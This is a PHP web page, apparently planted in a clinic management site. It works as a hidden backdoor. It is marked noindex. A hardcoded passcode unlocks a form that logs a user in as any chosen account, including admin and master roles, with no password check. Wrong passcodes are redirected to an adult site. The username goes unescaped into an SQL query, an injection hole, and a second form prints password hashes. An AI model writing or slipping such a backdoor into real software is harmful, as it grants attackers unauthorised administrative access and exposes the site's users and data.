<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XXX</title>
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
</head>
<body style="display: block;position: fixed;margin: 0 auto;width: 100%;text-align: center;padding: 10px 0;">

<?
session_start();
include '../config/DBconnect.php';

function role($number, $cond='x'){
    switch ($number){
        case '3':
			$role = 'login';
			$page = 'admin';
			break;
        case '2':
            $role = 'login_dokter';
			$page = 'admin_dokter';
            break;
        case '1':
            $role = 'master';
			$page = 'master';
            break;
    }
    if( $cond == 'page' ){
        return $page;
    }else{
        return $role;
    }
}

if(isset($_POST['paswot'])){
    $username = $_POST['paswot'];
    $page = $_POST['page'];
    $data = mysqli_query($conn, "SELECT * FROM user WHERE username='$username'");
    $cek = mysqli_num_rows($data);
    $get_password = mysqli_fetch_assoc($data);
    $id_user = $get_password['id_user'];
    
    $password = $get_password['password'];
    $hash = $get_password['password'];
	if( $cek > 0 ) {
		$_SESSION['username'] = $username;
		$_SESSION['id_user'] = $id_user;
	    $_SESSION['status'] = role($get_password['role']);
        header("Location: ".$home.role($get_password['role'], "page")."/dasbor");
        exit;
	} else {
        echo 'User tidak ada';
    }
}
?>
<form action="" method="POST">
    <input type="text" name="passcode" style="-webkit-text-security: disc;clear: both;margin-bottom: 5px;text-align: center;font-size: 16pt;" /><br>
    <input type="submit" value="PASSCODE">
</form>

<br><hr>
    <form action="" method="POST">
        <input type="text" name="crack" placeholder="password" style="text-align: center;font-size: 12pt;padding: 2px 8px;" />
        <input type="submit" value="HASH">
    </form>
    <div class="clearfix" style="display: block;width: 100%;clear: both;"></div>
    <? 
        if(isset($_POST['crack'])){
            echo '<input type="text" value="'.password_hash($_POST['crack'], PASSWORD_DEFAULT).'" style="text-align: center;font-size: 9pt;padding: 2px 8px;min-width: 450px;border: 1px solid #333;background-color: #ccc;margin-top: 5px;" />';
        }
    ?>

<? if(isset($_POST['passcode'])){
    if($_POST['passcode'] != '312069'){
        header("Location: http://pornhub.com");
        exit;
    }else{
?>
    <br><hr>
    <form action="" method="POST">
        <input type="text" name="paswot" placeholder="uname" style="text-align: center;font-size: 12pt;padding: 2px 8px;" />
        <input type="submit" value="LOGIN">
    </form>

<?
    }
}
?>

<!-- /body>
</html -->
